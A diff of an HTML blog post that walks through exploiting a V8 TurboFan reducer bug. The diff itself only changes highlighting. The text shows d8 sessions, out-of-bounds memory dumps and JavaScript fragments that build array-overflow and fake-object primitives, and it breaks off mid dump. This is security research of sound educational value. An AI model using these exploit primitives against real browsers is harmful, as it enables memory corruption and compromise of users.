@@ -202,25 +202,25 @@ gtag('config', 'G-MRPDMQ259W');
 <h1 id="setup">Setup</h1>
 <h2 id="building-v8">Building v8</h2>
 <p>Building v8 is very easy. You can simply fetch the sources using <a href="http://commondatastorage.googleapis.com/chrome-infra-docs/flat/depot_tools/docs/html/depot_tools_tutorial.html#_setting_up">depot tools</a> and then build using the following commands:</p>
-<div class="highlight"><pre><span></span><code><span class="err">fetch v8</span>
-<span class="err">gclient sync</span>
-<span class="err">./build/install-build-deps.sh</span>
-<span class="err">tools/dev/gm.py x64.release</span>
+<div class="highlight"><pre><span></span><code>fetch v8
+gclient sync
+./build/install-build-deps.sh
+tools/dev/gm.py x64.release
 </code></pre></div>
 
 
 <p>Please note that whenever you're updating the sources or checking out a specific commit, do <code>gclient sync</code> or you might be unable to build properly.</p>
 <h2 id="the-d8-shell">The d8 shell</h2>
 <p>A very convenient shell called <code>d8</code> is provided with the engine. For faster builds, limit the compilation to this shell:</p>
-<div class="highlight"><pre><span></span><code><span class="err">~/v8$  ./tools/dev/gm.py x64.release d8</span>
+<div class="highlight"><pre><span></span><code>~/v8$  ./tools/dev/gm.py x64.release d8
 </code></pre></div>
 
 
 <p>Try it:</p>
-<div class="highlight"><pre><span></span><code><span class="err">~/v8$ ./out/x64.release/d8 </span>
-<span class="err">V8 version 7.3.0 (candidate)</span>
-<span class="err">d8&gt; print(&quot;hello doare&quot;)</span>
-<span class="err">hello doare</span>
+<div class="highlight"><pre><span></span><code>~/v8$ ./out/x64.release/d8 
+V8 version 7.3.0 (candidate)
+d8&gt; print(&quot;hello doare&quot;)
+hello doare
 </code></pre></div>
 
 
@@ -271,10 +271,10 @@ DebugPrint: 0x37599d40aee1: [JSArray]
 <p>If you want to know about existing runtime functions, simply go to <code>src/runtime/</code> and grep on all the <code>RUNTIME_FUNCTION</code> (this is the macro used to declare a new runtime function).</p>
 <h2 id="preparing-turbolizer">Preparing Turbolizer</h2>
 <p>Turbolizer is a tool that we are going to use to debug TurboFan's <code>sea of nodes</code> graph.</p>
-<div class="highlight"><pre><span></span><code><span class="err">cd tools/turbolizer</span>
-<span class="err">npm i</span>
-<span class="err">npm run-script build</span>
-<span class="err">python -m SimpleHTTPServer</span>
+<div class="highlight"><pre><span></span><code>cd tools/turbolizer
+npm i
+npm run-script build
+python -m SimpleHTTPServer
 </code></pre></div>
 
 
@@ -1098,22 +1098,22 @@ d8&gt; %DumpObjects(Number.MAX_SAFE_INTEGER + 2, 10)
 <p>We do get a graph that looks exactly like the problematic drawing we showed before. Instead of getting two <code>NumberAdd(x,1)</code>, we get only one with <code>NumberAdd(x,2)</code>, which is not equivalent.</p>
 <p><img alt="vuln_numberadd" src="/images/swimming-in-a-sea-of-nodes/vuln_numberadd.png"></p>
 <p>The maximum value of <code>z</code> will be the following : </p>
-<div class="highlight"><pre><span></span><code><span class="err">d8&gt; var x = 9007199254740992</span>
-<span class="err">d8&gt; x = x + 2 // because of the buggy reducer!</span>
-<span class="err">9007199254740994</span>
-<span class="err">d8&gt; x = x - (4503599627370495*2)</span>
-<span class="err">4</span>
+<div class="highlight"><pre><span></span><code>d8&gt; var x = 9007199254740992
+d8&gt; x = x + 2 // because of the buggy reducer!
+9007199254740994
+d8&gt; x = x - (4503599627370495*2)
+4
 </code></pre></div>
 
 
 <p>However, the index range used when visiting <code>CheckBounds</code> during simplified lowering will be computed as follows : </p>
-<div class="highlight"><pre><span></span><code><span class="err">d8&gt; var x = 9007199254740992</span>
-<span class="err">d8&gt; x = x  + 1</span>
-<span class="err">9007199254740992</span>
-<span class="err">d8&gt; x = x  + 1</span>
-<span class="err">9007199254740992</span>
-<span class="err">d8&gt; x = x - (4503599627370495*2)</span>
-<span class="err">2</span>
+<div class="highlight"><pre><span></span><code>d8&gt; var x = 9007199254740992
+d8&gt; x = x  + 1
+9007199254740992
+d8&gt; x = x  + 1
+9007199254740992
+d8&gt; x = x - (4503599627370495*2)
+2
 </code></pre></div>
 
 
@@ -1131,39 +1131,39 @@ d8&gt; %DumpObjects(Number.MAX_SAFE_INTEGER + 2, 10)
 <h2 id="improving-the-primitive">Improving the primitive</h2>
 <p>One thing to try is to find a value such that the difference between <code>x + n + n</code> and <code>x + m</code> (with <code>m = n + n</code> and <code>x = Number.MAX_SAFE_INTEGER + 1</code>) is big enough.</p>
 <p>For instance, replacing <code>x + 007199254740989 + 9007199254740966</code> by <code>x + 9014398509481956</code> gives us an out of bounds by 4 and not 2 anymore.</p>
-<div class="highlight"><pre><span></span><code><span class="err">d8&gt; sum = 007199254740989 + 9007199254740966</span>
-<span class="err">x + 9014398509481956</span>
-<span class="err">d8&gt; a = x + sum</span>
-<span class="err">18021597764222948</span>
-<span class="err">d8&gt; b = x + 007199254740989 + 9007199254740966</span>
-<span class="err">18021597764222944</span>
-<span class="err">d8&gt; a - b</span>
-<span class="err">4</span>
+<div class="highlight"><pre><span></span><code>d8&gt; sum = 007199254740989 + 9007199254740966
+x + 9014398509481956
+d8&gt; a = x + sum
+18021597764222948
+d8&gt; b = x + 007199254740989 + 9007199254740966
+18021597764222944
+d8&gt; a - b
+4
 </code></pre></div>
 
 
 <p>And what if we do multiple additions to get even more precision loss? Like <code>x + n + n + n + n</code> to be transformed as <code>x + 4n</code>?</p>
-<div class="highlight"><pre><span></span><code><span class="err">d8&gt; var sum = 007199254740989 + 9007199254740966 + 007199254740989 + 9007199254740966</span>
-<span class="err">undefined</span>
-<span class="err">d8&gt; var x = Number.MAX_SAFE_INTEGER + 1</span>
-<span class="err">undefined</span>
-<span class="err">d8&gt; x + sum</span>
-<span class="err">27035996273704904</span>
-<span class="err">d8&gt; x + 007199254740989 + 9007199254740966 + 007199254740989 + 9007199254740966</span>
-<span class="err">27035996273704896</span>
-<span class="err">d8&gt; 27035996273704904 - 27035996273704896</span>
-<span class="err">8</span>
+<div class="highlight"><pre><span></span><code>d8&gt; var sum = 007199254740989 + 9007199254740966 + 007199254740989 + 9007199254740966
+undefined
+d8&gt; var x = Number.MAX_SAFE_INTEGER + 1
+undefined
+d8&gt; x + sum
+27035996273704904
+d8&gt; x + 007199254740989 + 9007199254740966 + 007199254740989 + 9007199254740966
+27035996273704896
+d8&gt; 27035996273704904 - 27035996273704896
+8
 </code></pre></div>
 
 
 <p>Now we get a delta of 8.</p>
 <p>Or maybe we could amplify even more the precision loss using other operators?</p>
-<div class="highlight"><pre><span></span><code><span class="err">d8&gt; var x = Number.MAX_SAFE_INTEGER + 1</span>
-<span class="err">undefined</span>
-<span class="err">d8&gt; 10 * (x + 1 + 1)</span>
-<span class="err">90071992547409920</span>
-<span class="err">d8&gt; 10 * (x + 2) </span>
-<span class="err">90071992547409940</span>
+<div class="highlight"><pre><span></span><code>d8&gt; var x = Number.MAX_SAFE_INTEGER + 1
+undefined
+d8&gt; 10 * (x + 1 + 1)
+90071992547409920
+d8&gt; 10 * (x + 2) 
+90071992547409940
 </code></pre></div>
 
 
@@ -1211,25 +1211,25 @@ Also, I use an <code>ArrayBuffer</code> with two views: one <code>Float64Array</
 
 
 <p>That gives the following results : </p>
-<div class="highlight"><pre><span></span><code><span class="n">oob</span> <span class="n">index</span> <span class="n">is</span> <span class="mi">4</span>
-<span class="n">length</span> <span class="n">is</span> <span class="mi">3</span>
-<span class="n">leaked</span> <span class="mh">0x0000000300000000</span>
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">FIXED_DOUBLE_ARRAY_TYPE</span> <span class="p">:</span> <span class="mh">0x28</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x00002e5fddf8b6a8</span>    <span class="mh">0x00002af7fe681451</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x00002e5fddf8b6b0</span>    <span class="mh">0x0000000300000000</span>    
-<span class="mh">0x00002e5fddf8b6b8</span>    <span class="mh">0x3ff199999999999a</span>    <span class="n">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
-<span class="mh">0x00002e5fddf8b6c0</span>    <span class="mh">0x3ff3333333333333</span>    <span class="n">arr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-<span class="mh">0x00002e5fddf8b6c8</span>    <span class="mh">0x3ff4cccccccccccd</span>    <span class="n">arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">FIXED_DOUBLE_ARRAY_TYPE</span> <span class="p">:</span> <span class="mh">0x28</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x00002e5fddf8b6d0</span>    <span class="mh">0x00002af7fe681451</span>    <span class="n">MAP_TYPE</span> <span class="c1">// also arr[3]</span>
-<span class="mh">0x00002e5fddf8b6d8</span>    <span class="mh">0x0000000300000000</span>    <span class="n">arr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="n">with</span> <span class="n">OOB</span> <span class="n">index</span><span class="o">!</span>
-<span class="mh">0x00002e5fddf8b6e0</span>    <span class="mh">0x40450ccccccccccd</span>    <span class="n">arr2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mf">42.1</span>
-<span class="mh">0x00002e5fddf8b6e8</span>    <span class="mh">0x4045000000000000</span>    <span class="n">arr2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mf">42.0</span>
-<span class="mh">0x00002e5fddf8b6f0</span>    <span class="mh">0x4045000000000000</span>    
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">JS_ARRAY_TYPE</span> <span class="p">:</span> <span class="mh">0x20</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x00002e5fddf8b6f8</span>    <span class="mh">0x0000290fb3502cf1</span>    <span class="n">MAP_TYPE</span>    <span class="n">arr2</span> <span class="n">JSArray</span>
-<span class="mh">0x00002e5fddf8b700</span>    <span class="mh">0x00002af7fe680c19</span>    <span class="n">FIXED_ARRAY_TYPE</span> <span class="p">[</span><span class="n">as</span><span class="p">]</span>   
-<span class="mh">0x00002e5fddf8b708</span>    <span class="mh">0x00002e5fddf8b6d1</span>    <span class="n">FIXED_DOUBLE_ARRAY_TYPE</span>   
+<div class="highlight"><pre><span></span><code>oob index is 4
+length is 3
+leaked 0x0000000300000000
+----- [ FIXED_DOUBLE_ARRAY_TYPE : 0x28 ] -----
+0x00002e5fddf8b6a8    0x00002af7fe681451    MAP_TYPE    
+0x00002e5fddf8b6b0    0x0000000300000000    
+0x00002e5fddf8b6b8    0x3ff199999999999a    arr[0]
+0x00002e5fddf8b6c0    0x3ff3333333333333    arr[1]
+0x00002e5fddf8b6c8    0x3ff4cccccccccccd    arr[2]
+----- [ FIXED_DOUBLE_ARRAY_TYPE : 0x28 ] -----
+0x00002e5fddf8b6d0    0x00002af7fe681451    MAP_TYPE // also arr[3]
+0x00002e5fddf8b6d8    0x0000000300000000    arr[4] with OOB index!
+0x00002e5fddf8b6e0    0x40450ccccccccccd    arr2[0] == 42.1
+0x00002e5fddf8b6e8    0x4045000000000000    arr2[1] == 42.0
+0x00002e5fddf8b6f0    0x4045000000000000    
+----- [ JS_ARRAY_TYPE : 0x20 ] -----
+0x00002e5fddf8b6f8    0x0000290fb3502cf1    MAP_TYPE    arr2 JSArray
+0x00002e5fddf8b700    0x00002af7fe680c19    FIXED_ARRAY_TYPE [as]   
+0x00002e5fddf8b708    0x00002e5fddf8b6d1    FIXED_DOUBLE_ARRAY_TYPE   
 </code></pre></div>
 
 
@@ -1243,25 +1243,25 @@ Please note that we changed a little bit the trigger code : </p>
 
 
 <p>Otherwise we would read/write the <code>map</code> instead, as demonstrates the following dump : </p>
-<div class="highlight"><pre><span></span><code><span class="n">oob</span> <span class="n">index</span> <span class="n">is</span> <span class="mi">4</span>
-<span class="n">length</span> <span class="n">is</span> <span class="mi">4</span>
-<span class="n">leaked</span> <span class="mh">0x0000057520401451</span>
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">FIXED_DOUBLE_ARRAY_TYPE</span> <span class="p">:</span> <span class="mh">0x30</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x0000108bcf50b6c0</span>    <span class="mh">0x0000057520401451</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x0000108bcf50b6c8</span>    <span class="mh">0x0000000400000000</span>    
-<span class="mh">0x0000108bcf50b6d0</span>    <span class="mh">0x3ff199999999999a</span>    <span class="n">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mf">1.1</span>
-<span class="mh">0x0000108bcf50b6d8</span>    <span class="mh">0x3ff3333333333333</span>    <span class="n">arr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-<span class="mh">0x0000108bcf50b6e0</span>    <span class="mh">0x3ff4cccccccccccd</span>    <span class="n">arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
-<span class="mh">0x0000108bcf50b6e8</span>    <span class="mh">0x3ff6666666666666</span>    <span class="n">arr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="mf">1.3</span>
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">FIXED_DOUBLE_ARRAY_TYPE</span> <span class="p">:</span> <span class="mh">0x28</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x0000108bcf50b6f0</span>    <span class="mh">0x0000057520401451</span>    <span class="n">MAP_TYPE</span>    <span class="n">arr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="n">with</span> <span class="n">OOB</span> <span class="n">index</span><span class="o">!</span>
-<span class="mh">0x0000108bcf50b6f8</span>    <span class="mh">0x0000000300000000</span>    
-<span class="mh">0x0000108bcf50b700</span>    <span class="mh">0x40450ccccccccccd</span>    
-<span class="mh">0x0000108bcf50b708</span>    <span class="mh">0x4045000000000000</span>    
-<span class="mh">0x0000108bcf50b710</span>    <span class="mh">0x4045000000000000</span>    
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">JS_ARRAY_TYPE</span> <span class="p">:</span> <span class="mh">0x20</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x0000108bcf50b718</span>    <span class="mh">0x00001dd08d482cf1</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x0000108bcf50b720</span>    <span class="mh">0x0000057520400c19</span>    <span class="n">FIXED_ARRAY_TYPE</span>   
+<div class="highlight"><pre><span></span><code>oob index is 4
+length is 4
+leaked 0x0000057520401451
+----- [ FIXED_DOUBLE_ARRAY_TYPE : 0x30 ] -----
+0x0000108bcf50b6c0    0x0000057520401451    MAP_TYPE    
+0x0000108bcf50b6c8    0x0000000400000000    
+0x0000108bcf50b6d0    0x3ff199999999999a    arr[0] == 1.1
+0x0000108bcf50b6d8    0x3ff3333333333333    arr[1]
+0x0000108bcf50b6e0    0x3ff4cccccccccccd    arr[2]
+0x0000108bcf50b6e8    0x3ff6666666666666    arr[3] == 1.3
+----- [ FIXED_DOUBLE_ARRAY_TYPE : 0x28 ] -----
+0x0000108bcf50b6f0    0x0000057520401451    MAP_TYPE    arr[4] with OOB index!
+0x0000108bcf50b6f8    0x0000000300000000    
+0x0000108bcf50b700    0x40450ccccccccccd    
+0x0000108bcf50b708    0x4045000000000000    
+0x0000108bcf50b710    0x4045000000000000    
+----- [ JS_ARRAY_TYPE : 0x20 ] -----
+0x0000108bcf50b718    0x00001dd08d482cf1    MAP_TYPE    
+0x0000108bcf50b720    0x0000057520400c19    FIXED_ARRAY_TYPE   
 </code></pre></div>
 
 
@@ -1292,9 +1292,9 @@ DebugPrint: 0xd893a90aed1: [JSArray]
 <p>If you want to get an OOB R/W primitive that's the <code>JSArray</code>'s length that you want to overwrite. Also if you were to have an out-of-bounds access on such an array, you may want to check that the size of the underlying fixed array is not too big. So, let's tweak a bit our code to target the <code>JSArray</code>'s length!</p>
 <p>If you look at the memory dump, you may think that having the allocated <code>JSArray</code> <em>before</em> the <code>FixedDoubleArray</code> mightbe convenient, right?</p>
 <p>Right now the layout is:  </p>
-<div class="highlight"><pre><span></span><code><span class="err">FIXED_DOUBLE_ARRAY_TYPE</span>
-<span class="err">FIXED_DOUBLE_ARRAY_TYPE</span>
-<span class="err">JS_ARRAY_TYPE</span>
+<div class="highlight"><pre><span></span><code>FIXED_DOUBLE_ARRAY_TYPE
+FIXED_DOUBLE_ARRAY_TYPE
+JS_ARRAY_TYPE
 </code></pre></div>
 
 
@@ -1332,10 +1332,10 @@ leaked 0x000009d6e6600c19
 
 <p>Cool, now we are able to access the <code>JSArray</code> instead of the <code>FixedDoubleArray</code>. However, we're accessing its <code>properties</code> field. </p>
 <p>Thanks to the precision loss when transforming <code>+1+1</code> into <code>+2</code> we get a difference of <code>2</code> between the computations. If we get a difference of <code>4</code>, we'll be at the right offset. Transforming <code>+1+1+1</code> into <code>+3</code> will give us this!</p>
-<div class="highlight"><pre><span></span><code><span class="err">d8&gt; x + 1 + 1 + 1</span>
-<span class="err">9007199254740992</span>
-<span class="err">d8&gt; x + 3</span>
-<span class="err">9007199254740996</span>
+<div class="highlight"><pre><span></span><code>d8&gt; x + 1 + 1 + 1
+9007199254740992
+d8&gt; x + 3
+9007199254740996
 </code></pre></div>
 
 
@@ -1365,9 +1365,9 @@ leaked 0x0000000300000000
 
 
 <p>Now to leak the <code>ArrayBuffer</code>'s data, it's very easy. Just allocate it right after the second <code>JSArray</code>.</p>
-<div class="highlight"><pre><span></span><code><span class="err">  let arr = new Array(MAGIC,MAGIC,MAGIC);</span>
-<span class="err">  arr2 = Array.of(1.2); // allows to put the JSArray *before* the fixed arrays</span>
-<span class="err">  ab = new ArrayBuffer(AB_LENGTH);</span>
+<div class="highlight"><pre><span></span><code><span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">MAGIC</span><span class="p">,</span><span class="nx">MAGIC</span><span class="p">,</span><span class="nx">MAGIC</span><span class="p">);</span>
+<span class="nx">arr2</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="k">of</span><span class="p">(</span><span class="mf">1.2</span><span class="p">);</span> <span class="c1">// allows to put the JSArray *before* the fixed arrays</span>
+<span class="nx">ab</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="nx">AB_LENGTH</span><span class="p">);</span>
 </code></pre></div>
 
 
@@ -1408,14 +1408,14 @@ leaked 0x0000000300000000
 <h2 id="step-2-getting-a-fake-object">Step 2 : Getting a fake object</h2>
 <p>Arrays of <code>PACKED_ELEMENTS</code> can contain tagged pointers to JavaScript objects. For those unfamiliar with v8, the <code>elements kind</code> of a JsArray in v8 gives information about the type of elements it is storing.  <a href="https://v8.dev/blog/elements-kinds">Read this if you want to know more about elements kind</a>.</p>
 <p><img alt="elements_kind" src="/images/swimming-in-a-sea-of-nodes/elements_kind.png"></p>
-<div class="highlight"><pre><span></span><code><span class="n">d8</span><span class="o">&gt;</span><span class="w"> </span><span class="nf">var</span><span class="w"> </span><span class="n">objects</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="k">Array</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="k">Object</span><span class="p">())</span><span class="w"></span>
-<span class="n">d8</span><span class="o">&gt;</span><span class="w"> </span><span class="o">%</span><span class="n">DebugPrint</span><span class="p">(</span><span class="n">objects</span><span class="p">)</span><span class="w"></span>
-<span class="nl">DebugPrint</span><span class="p">:</span><span class="w"> </span><span class="mh">0xd79e750aee9</span><span class="err">:</span><span class="w"> </span><span class="o">[</span><span class="n">JSArray</span><span class="o">]</span><span class="w"></span>
-<span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nl">elements</span><span class="p">:</span><span class="w"> </span><span class="mh">0x0d79e750af19</span><span class="w"> </span><span class="o">&lt;</span><span class="n">FixedArray</span><span class="o">[</span><span class="n">1</span><span class="o">]&gt;</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
-<span class="w">           </span><span class="mi">0</span><span class="err">:</span><span class="w"> </span><span class="mh">0x0d79e750aeb1</span><span class="w"> </span><span class="o">&lt;</span><span class="k">Object</span><span class="w"> </span><span class="k">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x19c550d80451</span><span class="o">&gt;</span><span class="w"></span>
-<span class="w"> </span><span class="err">}</span><span class="w"></span>
-<span class="mh">0x19c550d82d91</span><span class="err">:</span><span class="w"> </span><span class="o">[</span><span class="n">Map</span><span class="o">]</span><span class="w"></span>
-<span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">elements</span><span class="w"> </span><span class="nl">kind</span><span class="p">:</span><span class="w"> </span><span class="n">PACKED_ELEMENTS</span><span class="w"></span>
+<div class="highlight"><pre><span></span><code>d8&gt; var objects = new Array(new Object())
+d8&gt; %DebugPrint(objects)
+DebugPrint: 0xd79e750aee9: [JSArray]
+ - elements: 0x0d79e750af19 &lt;FixedArray[1]&gt; {
+           0: 0x0d79e750aeb1 &lt;Object map = 0x19c550d80451&gt;
+ }
+0x19c550d82d91: [Map]
+ - elements kind: PACKED_ELEMENTS
 </code></pre></div>
 
 
@@ -1423,53 +1423,53 @@ leaked 0x0000000300000000
 <p>Indeed, we know that the very first field of any object is a a pointer to a <code>map</code> (long story short, the map is the object that describes the type of the object. Other engines call it a <code>Shape</code> or a <code>Structure</code>. If you want to know more, just read <a href="https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/#shapes">the previous post on SpiderMonkey</a> or <a href="https://mathiasbynens.be/notes/shapes-ics">this blog post</a>).</p>
 <p>Therefore, if v8 indeed considers our pointer as an object pointer, when trying to use it, we should expect a crash when dereferencing the <code>map</code>.</p>
 <p>Achieving this is as easy as allocating an array with an object pointer, looking for the index to the object pointer, and replacing it by the (tagged) pointer to the previously leaked <code>backing_store</code>.</p>
-<div class="highlight"><pre><span></span><code>  <span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">MAGIC</span><span class="p">,</span><span class="nx">MAGIC</span><span class="p">,</span><span class="nx">MAGIC</span><span class="p">);</span>
-  <span class="nx">arr2</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="k">of</span><span class="p">(</span><span class="mf">1.2</span><span class="p">);</span> <span class="c1">// allows to put the JSArray *before* the fixed arrays</span>
-  <span class="nx">evil_ab</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="nx">AB_LENGTH</span><span class="p">);</span>
-  <span class="nx">packed_elements_array</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="k">of</span><span class="p">(</span><span class="nx">MARK1SMI</span><span class="p">,</span><span class="nb">Math</span><span class="p">,</span><span class="nx">MARK2SMI</span><span class="p">);</span>
+<div class="highlight"><pre><span></span><code><span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">MAGIC</span><span class="p">,</span><span class="nx">MAGIC</span><span class="p">,</span><span class="nx">MAGIC</span><span class="p">);</span>
+<span class="nx">arr2</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="k">of</span><span class="p">(</span><span class="mf">1.2</span><span class="p">);</span> <span class="c1">// allows to put the JSArray *before* the fixed arrays</span>
+<span class="nx">evil_ab</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="nx">AB_LENGTH</span><span class="p">);</span>
+<span class="nx">packed_elements_array</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="k">of</span><span class="p">(</span><span class="nx">MARK1SMI</span><span class="p">,</span><span class="nb">Math</span><span class="p">,</span><span class="nx">MARK2SMI</span><span class="p">);</span>
 </code></pre></div>
 
 
 <p>Quickly check the memory layout.</p>
-<div class="highlight"><pre><span></span><code><span class="o">-----</span> <span class="p">[</span> <span class="nl">FIXED_DOUBLE_ARRAY_TYPE</span> <span class="p">:</span> <span class="mh">0x28</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x0000220f2ec82410</span>    <span class="mh">0x0000353622a01451</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x0000220f2ec82418</span>    <span class="mh">0x0000000300000000</span>    
-<span class="mh">0x0000220f2ec82420</span>    <span class="mh">0x3ff199999999999a</span>    
-<span class="mh">0x0000220f2ec82428</span>    <span class="mh">0x3ff199999999999a</span>    
-<span class="mh">0x0000220f2ec82430</span>    <span class="mh">0x3ff199999999999a</span>    
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">JS_ARRAY_TYPE</span> <span class="p">:</span> <span class="mh">0x20</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x0000220f2ec82438</span>    <span class="mh">0x0000261a44682d41</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x0000220f2ec82440</span>    <span class="mh">0x0000353622a00c19</span>    <span class="n">FIXED_ARRAY_TYPE</span>    
-<span class="mh">0x0000220f2ec82448</span>    <span class="mh">0x0000220f2ec82471</span>    <span class="n">FIXED_DOUBLE_ARRAY_TYPE</span>    
-<span class="mh">0x0000220f2ec82450</span>    <span class="mh">0x0000006400000000</span>    
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">FIXED_ARRAY_TYPE</span> <span class="p">:</span> <span class="mh">0x18</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x0000220f2ec82458</span>    <span class="mh">0x0000353622a007a9</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x0000220f2ec82460</span>    <span class="mh">0x0000000100000000</span>    
-<span class="mh">0x0000220f2ec82468</span>    <span class="mh">0x0000353622a005a9</span>    <span class="n">ODDBALL_TYPE</span>    
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">FIXED_DOUBLE_ARRAY_TYPE</span> <span class="p">:</span> <span class="mh">0x18</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x0000220f2ec82470</span>    <span class="mh">0x0000353622a01451</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x0000220f2ec82478</span>    <span class="mh">0x0000000100000000</span>    
-<span class="mh">0x0000220f2ec82480</span>    <span class="mh">0x3ff3333333333333</span>    
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">JS_ARRAY_BUFFER_TYPE</span> <span class="p">:</span> <span class="mh">0x40</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x0000220f2ec82488</span>    <span class="mh">0x0000261a446821b1</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x0000220f2ec82490</span>    <span class="mh">0x0000353622a00c19</span>    <span class="n">FIXED_ARRAY_TYPE</span>    
-<span class="mh">0x0000220f2ec82498</span>    <span class="mh">0x0000353622a00c19</span>    <span class="n">FIXED_ARRAY_TYPE</span>    
-<span class="mh">0x0000220f2ec824a0</span>    <span class="mh">0x0000000000000100</span>    
-<span class="mh">0x0000220f2ec824a8</span>    <span class="mh">0x00005599e4b21f40</span>    
-<span class="mh">0x0000220f2ec824b0</span>    <span class="mh">0x0000000000000002</span>    
-<span class="mh">0x0000220f2ec824b8</span>    <span class="mh">0x0000000000000000</span>    
-<span class="mh">0x0000220f2ec824c0</span>    <span class="mh">0x0000000000000000</span>    
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">JS_ARRAY_TYPE</span> <span class="p">:</span> <span class="mh">0x20</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x0000220f2ec824c8</span>    <span class="mh">0x0000261a44682de1</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x0000220f2ec824d0</span>    <span class="mh">0x0000353622a00c19</span>    <span class="n">FIXED_ARRAY_TYPE</span>    
-<span class="mh">0x0000220f2ec824d8</span>    <span class="mh">0x0000220f2ec824e9</span>    <span class="n">FIXED_ARRAY_TYPE</span>    
-<span class="mh">0x0000220f2ec824e0</span>    <span class="mh">0x0000000300000000</span>    
-<span class="o">-----</span> <span class="p">[</span> <span class="nl">FIXED_ARRAY_TYPE</span> <span class="p">:</span> <span class="mh">0x28</span> <span class="p">]</span> <span class="o">-----</span>
-<span class="mh">0x0000220f2ec824e8</span>    <span class="mh">0x0000353622a007a9</span>    <span class="n">MAP_TYPE</span>    
-<span class="mh">0x0000220f2ec824f0</span>    <span class="mh">0x0000000300000000</span>    
-<span class="mh">0x0000220f2ec824f8</span>    <span class="mh">0x0000001300000000</span>    <span class="c1">// MARK 1 for memory scanning</span>
-<span class="mh">0x0000220f2ec82500</span>    <span class="mh">0x00002f3befd86b81</span>    <span class="n">JS_OBJECT_TYPE</span>    
-<span class="mh">0x0000220f2ec82508</span>    <span class="mh">0x0000003700000000</span>    <span class="c1">// MARK 2 for memory scanning</span>
+<div class="highlight"><pre><span></span><code>----- [ FIXED_DOUBLE_ARRAY_TYPE : 0x28 ] -----
+0x0000220f2ec82410    0x0000353622a01451    MAP_TYPE    
+0x0000220f2ec82418    0x0000000300000000    
+0x0000220f2ec82420    0x3ff199999999999a    
+0x0000220f2ec82428    0x3ff199999999999a    
+0x0000220f2ec82430    0x3ff199999999999a    
+----- [ JS_ARRAY_TYPE : 0x20 ] -----
+0x0000220f2ec82438    0x0000261a44682d41    MAP_TYPE    
+0x0000220f2ec82440    0x0000353622a00c19    FIXED_ARRAY_TYPE    
+0x0000220f2ec82448    0x0000220f2ec82471    FIXED_DOUBLE_ARRAY_TYPE    
+0x0000220f2ec82450    0x0000006400000000    
+----- [ FIXED_ARRAY_TYPE : 0x18 ] -----
+0x0000220f2ec82458    0x0000353622a007a9    MAP_TYPE    
+0x0000220f2ec82460    0x0000000100000000    
